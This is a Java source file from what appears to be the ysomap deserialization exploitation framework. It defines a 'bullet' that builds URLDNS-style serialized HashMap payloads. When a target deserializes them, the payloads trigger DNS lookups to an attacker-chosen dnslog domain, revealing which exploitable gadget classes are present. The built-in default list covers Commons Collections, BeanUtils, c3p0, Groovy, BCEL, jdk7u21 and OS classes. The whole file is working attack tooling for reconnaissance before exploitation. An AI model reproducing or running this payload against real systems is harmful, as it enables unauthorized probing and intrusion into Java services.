package ysomap.bullets.jdk;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.*;

/**
 * @author Ar3h
 * @since 2022/11/06
 */
@Bullets
@Details("向外部发起DNS查询，配合DetectClass使用")
@Targets({Targets.JDK})
@Dependencies({"jdk"})
public class DetectClassBullet extends AbstractBullet<List> {
    @NotNull
    @Require(name = "domain", detail = "设置Dnslog地址")
    private String domain = null;
    
    @NotNull
    @Require(name = "param", type = "string", detail = "设置你想回显的子域名标识以及探测的类，多个探测用分号分割\n例: linux:com.sun.security.auth.module.UnixSystem;becl:com.sun.org.apache.bcel.internal.util.ClassLoader。\n默认内置了探测常规利用类")
    private String param = "default";
    
    private HashMap<String, String> params = new HashMap<>(); // 预设参数
    
    private List hashMapGadgets = new ArrayList<>();
    
    @Override
    public List getObject() throws Exception {
        List<Object> list = new LinkedList();
        parseParam();
        list.addAll(hashMapGadgets);
        return list;
    }
    
    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new DetectClassBullet();
        bullet.set("domain", args[0]);
        bullet.set("param", args[1]);
        return bullet;
    }
    
    private void parseParam() {
        String fullStr = params.get(param);
        if (fullStr == null) {  // 自定义的参数
            fullStr = param;
        }
        
        if (fullStr.contains(";") || fullStr.contains("\n")) {
            String[] strings = fullStr.split("\n|;");
            for (String singleStr :
                    strings) {
                parseLine(singleStr);
            }
        } else {
            parseLine(fullStr);
        }
    }
    
    private void parseLine(String singleStr) {
        if (singleStr.contains(":")) {
            String[] split = singleStr.split(":");
            String domain = split[0];
            String className = split[1];
            String url = String.format("http://%s.%s", domain, this.domain);
            HashMap hashMapPayload = getHashMapPayload(url, className);
            Logger.normal(Arrays.toString(split));
            hashMapGadgets.add(hashMapPayload);
        }
    }
    
    public HashMap getHashMapPayload(String urls, String clazzName) {
        HashMap hashMap = new HashMap();
        try {
            URL url = new URL(urls);
            Field f = this.getClass("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true);
            f.set(url, 0);
            Class clazz = this.getClass(clazzName);
            hashMap.put(url, clazz);
            f.set(url, -1);
        } catch (Exception e) {
            Logger.error(e.toString());
        }
        return hashMap;
    }
    
    public Class getClass(String clazzName) throws Exception {
        Class clazz;
        try {
            clazz = Class.forName(clazzName);
            return clazz;
        } catch (ClassNotFoundException e) {
        }
        
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass;
        
        try {
            ctClass = classPool.get(clazzName); // 防止重复构造类导致第二次运行报错
            return ctClass.toClass();
        } catch (NotFoundException e) {
        }
        
        ctClass = classPool.makeClass(clazzName);
        clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
    
    {
        params.put("default", "cc31all:org.apache.commons.collections.functors.ChainedTransformer\n" +
                "cc32x:org.apache.commons.collections.buffer.BoundedBuffer\n" +
                "cc40all:org.apache.commons.collections4.functors.ChainedTransformer\n" +
                "cc41:org.apache.commons.collections4.FluentIterable\n" +
                "cb17x18xall:org.apache.commons.beanutils.BeanComparator\n" +
                "cb19x:org.apache.commons.beanutils.BeanIntrospectionData\n" +
                "c3p092x:com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\n" +
                "c3p095x:com.mchange.v2.c3p0.test.AlwaysFailDataSource\n" +
                "ajw:org.aspectj.weaver.tools.cache.SimpleCache\n" +
                "bsh20b4:bsh.XThis\n" +
                "bsh20b5:bsh.engine.BshScriptEngine\n" +
                "groovy23x:org.codehaus.groovy.runtime.MethodClosure\n" +
                "groovy24x:groovy.lang.Tuple2\n" +
                "bcel:com.sun.org.apache.bcel.internal.util.ClassLoader\n" +
                "jdk7u21:com.sun.corba.se.impl.orbutil.ORBClassLoader\n" +
                "linux:com.sun.security.auth.module.UnixSystem\n" +
                "windows:com.sun.security.auth.module.NTSystem");
    }
    
}


